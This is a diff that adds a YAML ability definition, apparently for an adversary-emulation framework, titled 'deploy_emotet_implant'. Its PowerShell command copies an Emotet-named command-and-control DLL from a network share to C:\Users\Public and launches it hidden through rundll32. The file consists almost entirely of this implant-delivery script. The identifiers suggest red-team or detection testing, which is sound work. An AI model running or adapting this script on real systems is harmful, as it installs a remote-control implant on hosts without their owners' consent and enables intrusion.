@@ -1,0 +1,27 @@
+---
+- id: a1b2c3d4-e5f6-5a7b-8c9d-0e1f2a3b4c5d
+  name: deploy_emotet_implant
+  description: Deploy Emotet HTTP C2 DLL implant to victim host via rundll32
+  tactic: command-and-control
+  technique_id: T1071.001
+  technique_name: Application Layer Protocol Web Protocols
+  executors:
+  - name: psh
+    platform: windows
+    command: |
+      $runId = $env:C2TRACE_RUN_ID
+      if (-not $runId) { $runId = "emotet-default" }
+      $dllPath = "C:\Users\Public\c2t_$runId.dll"
+      Copy-Item -Path "\\192.168.21.132\c2trace\EmotetClientDLL-windows-amd64.dll" -Destination $dllPath -Force
+      Start-Process -FilePath "rundll32.exe" -ArgumentList "$dllPath,Control_RunDLL" -WindowStyle Hidden
+      Start-Sleep -Seconds 15
+      Write-Output "Emotet implant deployed: $dllPath"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
